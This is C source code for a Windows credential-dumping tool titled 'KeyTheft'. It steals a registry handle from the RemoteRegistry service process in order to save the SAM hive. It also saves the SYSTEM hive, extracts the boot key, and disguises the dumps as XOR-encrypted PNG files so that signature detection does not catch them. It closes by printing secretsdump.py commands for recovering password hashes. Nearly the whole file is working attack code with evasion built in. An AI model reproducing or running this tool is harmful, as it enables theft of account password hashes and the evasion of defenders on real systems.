typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

#define SystemExtendedHandleInformation 64

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation
} KEY_INFORMATION_CLASS;

typedef struct _KEY_NAME_INFORMATION {
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

/* ══════════════════════════════════════════════════════════════════════
 * NT API Function Pointers
 * ══════════════════════════════════════════════════════════════════════ */

typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtDuplicateObject)(
    HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtQueryKey)(
    HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtSaveKey)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);
typedef BOOLEAN  (WINAPI *fn_RtlGenRandom)(PVOID, ULONG);

static fn_NtQuerySystemInformation pNtQuerySystemInformation;
static fn_NtDuplicateObject        pNtDuplicateObject;
static fn_NtQueryKey                pNtQueryKey;
static fn_NtSaveKey                 pNtSaveKey;
static fn_NtClose                   pNtClose;

static const WCHAR SAM_PATH[]   = L"\\REGISTRY\\MACHINE\\SAM";
static const ULONG SAM_PATH_LEN = 21;


static const BYTE PNG_SIG[8] = {
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
};

/* Minimal valid IHDR: 1×1 pixel, RGBA, 8-bit */
static const BYTE PNG_IHDR[25] = {
    0x00,0x00,0x00,0x0D,           /* chunk data length = 13 */
    0x49,0x48,0x44,0x52,           /* chunk type = "IHDR"    */
    0x00,0x00,0x00,0x01,           /* width  = 1             */
    0x00,0x00,0x00,0x01,           /* height = 1             */
    0x08,                           /* bit depth = 8          */
    0x06,                           /* color type = RGBA      */
    0x00,0x00,0x00,                 /* compress/filter/intlce */
    0x1F,0x15,0xC4,0x89            /* CRC32                  */
};

#define PNG_HDR_SIZE  (sizeof(PNG_SIG) + sizeof(PNG_IHDR))  /* 33 */
#define XOR_KEY_SIZE  16

/*
 * DisguiseAsImage — Read plaintext hive, XOR encrypt, write as PNG.
 * Deletes the source file on success.
 */
static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
                             const BYTE xorKey[XOR_KEY_SIZE])
{
    HANDLE hIn = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dataSize = GetFileSize(hIn, NULL);
    if (dataSize == INVALID_FILE_SIZE || dataSize == 0) {
        CloseHandle(hIn);
        return FALSE;
    }

    BYTE *data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dataSize);
    if (!data) { CloseHandle(hIn); return FALSE; }

    DWORD rd;
    if (!ReadFile(hIn, data, dataSize, &rd, NULL) || rd != dataSize) {
        HeapFree(GetProcessHeap(), 0, data);
        CloseHandle(hIn);
        return FALSE;
    }
    CloseHandle(hIn);

    /* XOR encrypt — breaks regf magic and all signature patterns */
    for (DWORD i = 0; i < dataSize; i++)
        data[i] ^= xorKey[i % XOR_KEY_SIZE];

    /* Write PNG header + encrypted payload */
    HANDLE hOut = CreateFileW(dstPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, data);
        return FALSE;
    }

    DWORD wr;
    WriteFile(hOut, PNG_SIG,  sizeof(PNG_SIG),  &wr, NULL);
    WriteFile(hOut, PNG_IHDR, sizeof(PNG_IHDR), &wr, NULL);
    WriteFile(hOut, data, dataSize, &wr, NULL);
    CloseHandle(hOut);

    HeapFree(GetProcessHeap(), 0, data);

    /* Delete plaintext hive — only encrypted PNG remains */
    DeleteFileW(srcPath);

    wprintf(L"  [+] %ls (%lu bytes)\n", dstPath,
        (unsigned long)(dataSize + PNG_HDR_SIZE));
    return TRUE;
}

/* ══════════════════════════════════════════════════════════════════════
 * Helpers
 * ══════════════════════════════════════════════════════════════════════ */

static BOOL InitNtApis(void)
{
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return FALSE;
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)
        GetProcAddress(h, "NtQuerySystemInformation");
    pNtDuplicateObject = (fn_NtDuplicateObject)
        GetProcAddress(h, "NtDuplicateObject");
    pNtQueryKey = (fn_NtQueryKey)GetProcAddress(h, "NtQueryKey");
    pNtSaveKey  = (fn_NtSaveKey) GetProcAddress(h, "NtSaveKey");
    pNtClose    = (fn_NtClose)   GetProcAddress(h, "NtClose");
    return pNtQuerySystemInformation && pNtDuplicateObject &&
           pNtQueryKey && pNtSaveKey && pNtClose;
}

static BOOL EnablePriv(LPCWSTR name)
{
    HANDLE hTok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) {
        CloseHandle(hTok); return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hTok);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * Key Type Index Detection
 * ══════════════════════════════════════════════════════════════════════ */

static USHORT GetKeyTypeIndex(void)
{
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0,
            KEY_READ, &hk) != ERROR_SUCCESS)
        return 0;

    USHORT idx = 0;
    ULONG  sz  = 0x400000;
    PSYSTEM_HANDLE_INFORMATION_EX info = NULL;
    NTSTATUS st;

    do {
        info = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(
            GetProcessHeap(), 0, sz);
        if (!info) break;
        st = pNtQuerySystemInformation(SystemExtendedHandleInformation,
                                       info, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            HeapFree(GetProcessHeap(), 0, info);
            info = NULL;
            sz *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (NT_SUCCESS(st) && info) {
        DWORD myPid = GetCurrentProcessId();
        for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
            if (info->Handles[i].UniqueProcessId == (ULONG_PTR)myPid &&
                info->Handles[i].HandleValue == (ULONG_PTR)hk) {
                idx = info->Handles[i].ObjectTypeIndex;
                break;
            }
        }
    }
    if (info) HeapFree(GetProcessHeap(), 0, info);
    RegCloseKey(hk);
    return idx;
}

/* ══════════════════════════════════════════════════════════════════════
 * Core: Steal Handle + NtSaveKey
 * ══════════════════════════════════════════════════════════════════════ */

static BOOL StealAndSave(
    DWORD   targetPid,
    LPCWSTR keyPath,
    ULONG   keyPathLen,
    LPCWSTR outputFile,
    USHORT  keyTypeIdx,
    LPCWSTR label)
{
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProc) {
        wprintf(L"  [-] OpenProcess(%lu) failed: %lu\n",
            targetPid, GetLastError());
        return FALSE;
    }

    ULONG sz = 0x4000000;
    PSYSTEM_HANDLE_INFORMATION_EX info = NULL;
    NTSTATUS st;

    do {
        info = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(
            GetProcessHeap(), 0, sz);
        if (!info) { CloseHandle(hProc); return FALSE; }
        st = pNtQuerySystemInformation(SystemExtendedHandleInformation,
                                       info, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            HeapFree(GetProcessHeap(), 0, info);
            info = NULL;
            sz *= 2;
            if (sz > 0x40000000) {
                CloseHandle(hProc); return FALSE;
            }
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) {
        if (info) HeapFree(GetProcessHeap(), 0, info);
        CloseHandle(hProc);
        return FALSE;
    }

    wprintf(L"  [*] Scanning %llu handles for PID %lu...\n",
        (unsigned long long)info->NumberOfHandles, targetPid);

    HANDLE hStolen = NULL;
    ULONG  checked = 0;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX *e = &info->Handles[i];
        if (e->UniqueProcessId != (ULONG_PTR)targetPid)  continue;
        if (e->ObjectTypeIndex  != keyTypeIdx)            continue;

        HANDLE hDup = NULL;
        st = pNtDuplicateObject(hProc, (HANDLE)e->HandleValue,
            GetCurrentProcess(), &hDup, 0, 0, DUPLICATE_SAME_ACCESS);
        if (!NT_SUCCESS(st) || !hDup) continue;
        checked++;

        BYTE buf[2048];
        ULONG resLen = 0;
        st = pNtQueryKey(hDup, KeyNameInformation, buf, sizeof(buf), &resLen);
        if (NT_SUCCESS(st)) {
            PKEY_NAME_INFORMATION kni = (PKEY_NAME_INFORMATION)buf;
            ULONG chars = kni->NameLength / sizeof(WCHAR);
            if (chars == keyPathLen &&
                _wcsnicmp(kni->Name, keyPath, keyPathLen) == 0) {
                wprintf(L"  [+] FOUND %ls — handle 0x%llX access 0x%08lX\n",
                    label, (unsigned long long)e->HandleValue, e->GrantedAccess);
                hStolen = hDup;
                break;
            }
        }
        pNtClose(hDup);
    }

    HeapFree(GetProcessHeap(), 0, info);
    CloseHandle(hProc);

    if (!hStolen) {
        wprintf(L"  [-] %ls handle not found (%lu keys checked)\n",
            label, checked);
        return FALSE;
    }

    HANDLE hFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        pNtClose(hStolen); return FALSE;
    }

    st = pNtSaveKey(hStolen, hFile);
    CloseHandle(hFile);
    pNtClose(hStolen);

    if (NT_SUCCESS(st)) {
        wprintf(L"  [+] %ls hive captured\n", label);
        return TRUE;
    }
    wprintf(L"  [-] NtSaveKey: 0x%08lX\n", (ULONG)st);
    DeleteFileW(outputFile);
    return FALSE;
}

/* ══════════════════════════════════════════════════════════════════════
 * RemoteRegistry Service → PID
 * ══════════════════════════════════════════════════════════════════════ */

static DWORD GetServicePid(LPCWSTR svcName)
{
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return 0;

    SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
        SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hSvc) { CloseServiceHandle(hScm); return 0; }

    SERVICE_STATUS_PROCESS ssp;
    DWORD needed;
    if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
            (BYTE *)&ssp, sizeof(ssp), &needed)) {
        CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
        return 0;
    }

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        if (!StartServiceW(hSvc, 0, NULL)) {
            if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
                wprintf(L"  [-] StartService: %lu\n", GetLastError());
                CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
                return 0;
            }
        }
        for (int t = 0; t < 20; t++) {
            Sleep(250);
            QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                (BYTE *)&ssp, sizeof(ssp), &needed);
            if (ssp.dwCurrentState == SERVICE_RUNNING) break;
        }
    }

    DWORD pid = ssp.dwProcessId;
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return pid;
}

/* ══════════════════════════════════════════════════════════════════════
 * Boot Key Extraction
 * ══════════════════════════════════════════════════════════════════════ */

static BOOL ExtractBootKey(BYTE bootKey[16])
{
    static const LPCWSTR names[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    static const BYTE perm[16] = {
        8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7
    };
    WCHAR hexBuf[64];
    ULONG pos = 0;

    for (int i = 0; i < 4; i++) {
        WCHAR path[256];
        _snwprintf(path, 256,
            L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\%ls", names[i]);
        HKEY hk;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0,
                KEY_READ, &hk) != ERROR_SUCCESS)
            return FALSE;
        WCHAR cls[64];
        DWORD clsLen = 64;
        LSTATUS r = RegQueryInfoKeyW(hk, cls, &clsLen, NULL,
            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hk);
        if (r != ERROR_SUCCESS) return FALSE;
        for (DWORD j = 0; j < clsLen && pos < 32; j++)
            hexBuf[pos++] = cls[j];
    }
    hexBuf[pos] = L'\0';
    if (pos != 32) return FALSE;

    BYTE scrambled[16];
    for (int i = 0; i < 16; i++) {
        WCHAR pair[3] = { hexBuf[i * 2], hexBuf[i * 2 + 1], 0 };
        scrambled[i] = (BYTE)wcstoul(pair, NULL, 16);
    }
    for (int i = 0; i < 16; i++)
        bootKey[i] = scrambled[perm[i]];
    return TRUE;
}

/* ══════════════════════════════════════════════════════════════════════
 * Entry Point
 * ══════════════════════════════════════════════════════════════════════ */

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"\n");
    wprintf(L"  ╔═══════════════════════════════════════════════════════╗\n");
    wprintf(L"  ║  KeyTheft, SAM Dump via RemoteRegistry Handle Theft ║\n");
    wprintf(L"  ║  Output: XOR-encrypted PNG (no regf on disk)         ║\n");
    wprintf(L"  ╚═══════════════════════════════════════════════════════╝\n\n");

    LPCWSTR samOut = (argc > 1) ? argv[1] : L"sam.png";
    LPCWSTR sysOut = (argc > 2) ? argv[2] : L"system.png";

    /* Temp paths for NtSaveKey (plaintext hive, deleted after XOR) */
    WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH];
    _snwprintf(samTmp, MAX_PATH, L"%ls.tmp", samOut);
    _snwprintf(sysTmp, MAX_PATH, L"%ls.tmp", sysOut);

    /* ── Init ── */
    if (!InitNtApis()) {
        wprintf(L"[-] Failed to resolve ntdll exports\n");
        return 1;
    }
    if (!EnablePriv(L"SeDebugPrivilege")) {
        wprintf(L"[-] SeDebugPrivilege FAILED (run as Administrator)\n");
        return 1;
    }
    if (!EnablePriv(L"SeBackupPrivilege")) {
        wprintf(L"[-] SeBackupPrivilege FAILED\n");
        return 1;
    }
    wprintf(L"[+] Privileges enabled\n");

    USHORT keyType = GetKeyTypeIndex();
    if (!keyType) {
        wprintf(L"[-] Key type index detection failed\n");
        return 1;
    }
    wprintf(L"[+] Key type index: %u\n", keyType);

    /* ═══════════════════════════════════════════════════════════════
     * SAM — KeyProxy: steal from RemoteRegistry svchost
     * ═══════════════════════════════════════════════════════════════ */
    wprintf(L"\n══ SAM hive (KeyProxy via RemoteRegistry) ══\n");

    DWORD svcPid = GetServicePid(L"RemoteRegistry");
    if (!svcPid) {
        wprintf(L"  [-] RemoteRegistry service unavailable\n");
        return 1;
    }
    wprintf(L"  [+] RemoteRegistry svchost PID: %lu\n", svcPid);

    /* Force svchost to open SAM via loopback RPC */
    HKEY hRemote = NULL;
    if (RegConnectRegistryW(L"\\\\localhost",
            HKEY_LOCAL_MACHINE, &hRemote) != ERROR_SUCCESS) {
        wprintf(L"  [-] RegConnectRegistryW failed\n");
        return 1;
    }
    HKEY hSamRemote = NULL;
    if (RegOpenKeyExW(hRemote, L"SAM", 0,
            KEY_READ, &hSamRemote) != ERROR_SUCCESS) {
        wprintf(L"  [-] Remote SAM open failed\n");
        RegCloseKey(hRemote);
        return 1;
    }
    wprintf(L"  [+] SAM opened via RemoteRegistry RPC\n");

    /* Steal the handle from svchost → save to temp file */
    BOOL samOk = StealAndSave(svcPid, SAM_PATH, SAM_PATH_LEN,
                              samTmp, keyType, L"SAM");

    RegCloseKey(hSamRemote);
    RegCloseKey(hRemote);

    /* ═══════════════════════════════════════════════════════════════
     * SYSTEM hive, direct save (admin-readable) → temp file
     * ═══════════════════════════════════════════════════════════════ */
    wprintf(L"\n══ SYSTEM hive ══\n");
    BOOL sysOk = FALSE;
    HKEY hSys;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0,
            KEY_READ, &hSys) == ERROR_SUCCESS) {
        HANDLE hf = CreateFileW(sysTmp, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            NTSTATUS st = pNtSaveKey((HANDLE)hSys, hf);
            CloseHandle(hf);
            if (NT_SUCCESS(st)) {
                wprintf(L"  [+] SYSTEM hive captured\n");
                sysOk = TRUE;
            } else {
                wprintf(L"  [-] NtSaveKey: 0x%08lX\n", (ULONG)st);
                DeleteFileW(sysTmp);
            }
        }
        RegCloseKey(hSys);
    }

    /* ═══════════════════════════════════════════════════════════════
     * XOR encrypt + PNG disguise
     * ═══════════════════════════════════════════════════════════════ */
    wprintf(L"\n══ Encoding output ══\n");

    /* Generate random XOR key (advapi32!SystemFunction036 = RtlGenRandom) */
    BYTE xorKey[XOR_KEY_SIZE];
    fn_RtlGenRandom pRtlGenRandom = (fn_RtlGenRandom)
        GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "SystemFunction036");

    if (pRtlGenRandom && pRtlGenRandom(xorKey, XOR_KEY_SIZE)) {
        /* CSPRNG — good */
    } else {
        /* Fallback LCG (still breaks signatures, not crypto-grade) */
        DWORD seed = GetTickCount() ^ (GetCurrentProcessId() << 16);
        for (int i = 0; i < XOR_KEY_SIZE; i++) {
            seed = seed * 1103515245 + 12345;
            xorKey[i] = (BYTE)(seed >> 16);
        }
    }

    if (samOk) samOk = DisguiseAsImage(samTmp, samOut, xorKey);
    if (sysOk) sysOk = DisguiseAsImage(sysTmp, sysOut, xorKey);

    /* ═══════════════════════════════════════════════════════════════
     * Boot key
     * ═══════════════════════════════════════════════════════════════ */
    wprintf(L"\n══ Boot key ══\n");
    BYTE bootKey[16];
    if (ExtractBootKey(bootKey)) {
        wprintf(L"  [+] Boot key: ");
        for (int i = 0; i < 16; i++) wprintf(L"%02x", bootKey[i]);
        wprintf(L"\n");
    }

    /* ═══════════════════════════════════════════════════════════════
     * Summary
     * ═══════════════════════════════════════════════════════════════ */
    wprintf(L"\n╔══════════════════════════════════════════════════╗\n");
    wprintf(L"║  SAM:    %-40ls║\n", samOk  ? L"SUCCESS" : L"FAILED");
    wprintf(L"║  SYSTEM: %-40ls║\n", sysOk  ? L"SUCCESS" : L"FAILED");
    wprintf(L"║  Format: PNG (XOR-encrypted, no regf on disk)   ║\n");
    wprintf(L"╚══════════════════════════════════════════════════╝\n");

    if (samOk || sysOk) {
        /* Print XOR key — SAVE THIS, required for decoding */
        wprintf(L"\n  ┌─ XOR KEY (save this!) ─────────────────────┐\n");
        wprintf(L"  │  ");
        for (int i = 0; i < XOR_KEY_SIZE; i++) wprintf(L"%02x", xorKey[i]);
        wprintf(L"  │\n");
        wprintf(L"  └──────────────────────────────────────────────┘\n");

        wprintf(L"\n  Decode:\n");
        wprintf(L"    python3 decode.py ");
        for (int i = 0; i < XOR_KEY_SIZE; i++) wprintf(L"%02x", xorKey[i]);
        wprintf(L" %ls %ls\n", samOut, sysOut);
        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv LOCAL\n\n");
    }

    /* Cleanup stale temp files (no-op if already deleted by DisguiseAsImage) */
    DeleteFileW(samTmp);
    DeleteFileW(sysTmp);

    return (samOk && sysOk) ? 0 : 1;
}
